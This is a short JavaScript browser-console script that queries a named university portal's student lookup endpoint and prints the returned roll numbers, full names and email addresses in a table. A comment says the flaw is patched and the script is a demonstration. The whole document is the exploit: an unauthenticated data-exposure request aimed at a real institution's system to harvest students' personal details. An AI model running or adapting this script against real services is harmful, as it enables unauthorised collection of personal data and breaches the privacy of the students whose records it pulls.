async function checkStudent(id) {
    const response = await fetch('https://fap.fpt.edu.vn/Schedule/ActivityStudent.aspx/GetStudent', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json; charset=utf-8' },
        body: JSON.stringify({ searchTerm: id })
    });
    const data = await response.json();
    console.table(data.d, ["RollNumber", "FullName", "Email"]);
}

// The script is entered via the console and it will output the results found in the database
// NOTE: The vulnerability has been patched and this script is meant for demonstration purposes.
checkStudent('HEXXXXXX');
